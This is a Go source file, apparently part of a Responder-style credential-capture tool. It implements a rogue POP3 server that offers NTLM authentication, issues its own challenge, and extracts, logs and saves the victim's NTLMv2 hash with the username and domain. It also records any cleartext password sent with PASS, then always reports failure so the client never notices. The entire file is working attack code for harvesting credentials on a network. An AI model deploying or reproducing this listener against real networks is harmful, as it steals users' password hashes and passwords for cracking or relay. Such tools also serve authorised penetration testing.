package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net"
	"strings"
	"time"
)

func servePOP3(ifaceIP net.IP) {
	ln, err := net.Listen("tcp4", fmt.Sprintf("%s:110", ifaceIP))
	if err != nil {
		logError("POP3 listen :110 — %v (need root?)", err)
		return
	}
	logInfo("POP3 listening on %s:110", ifaceIP)
	for {
		c, err := ln.Accept()
		if err != nil {
			continue
		}
		go handlePOP3(c)
	}
}

func handlePOP3(c net.Conn) {
	defer c.Close()
	c.SetDeadline(time.Now().Add(60 * time.Second))

	challenge := getChallenge()
	w := bufio.NewWriter(c)
	r := bufio.NewReader(c)
	send := func(msg string) { fmt.Fprintf(w, "%s\r\n", msg); w.Flush() }

	send("+OK POP3 server ready")

	for {
		line, err := r.ReadString('\n')
		if err != nil {
			return
		}
		line = strings.TrimRight(line, "\r\n")
		upper := strings.ToUpper(line)

		switch {
		case upper == "AUTH NTLM" || strings.HasPrefix(upper, "AUTH NTLM "):
			send("+") // continue request

			tokenLine, err := r.ReadString('\n')
			if err != nil {
				return
			}
			tokenLine = strings.TrimRight(tokenLine, "\r\n")
			raw, err := base64.StdEncoding.DecodeString(tokenLine)
			if err != nil {
				send("-ERR Authentication failed")
				return
			}
			ntlm := FindNTLMSSP(raw)
			if len(ntlm) < 12 || ntlmMsgType(ntlm) != 1 {
				send("-ERR Authentication failed")
				return
			}
			logVerbose("POP3 NTLM Type1 from %s", c.RemoteAddr())
			ntlmChallenge := BuildNTLMChallenge(challenge, sessionDomain, sessionMachineName)
			send("+ " + base64.StdEncoding.EncodeToString(ntlmChallenge))

			type3Line, err := r.ReadString('\n')
			if err != nil {
				return
			}
			type3Line = strings.TrimRight(type3Line, "\r\n")
			raw3, _ := base64.StdEncoding.DecodeString(type3Line)
			ntlm3 := FindNTLMSSP(raw3)
			if len(ntlm3) >= 12 && ntlmMsgType(ntlm3) == 3 {
				hash, user, domain, err := ParseNTLMAuthenticate(ntlm3, challenge)
				if err == nil {
					logSuccess("[POP3] NTLMv2 captured from %s", c.RemoteAddr())
					logSuccess("       %s\\%s", domain, user)
					logSuccess("       %s", hash)
					saveHash(hash)
				}
			}
			send("-ERR Authentication failed")
			return

		case strings.HasPrefix(upper, "USER "):
			send("+OK")
		case strings.HasPrefix(upper, "PASS "):
			pass := line[5:]
			if pass != "" {
				logSuccess("[POP3] Cleartext from %s: pass=%q", c.RemoteAddr(), pass)
			}
			send("-ERR Authentication failed")
			return
		case upper == "CAPA":
			send("+OK Capability list follows")
			send("AUTH NTLM")
			send("USER")
			send(".")
		case upper == "QUIT":
			send("+OK Bye")
			return
		default:
			send("-ERR Unknown command")
		}
	}
}
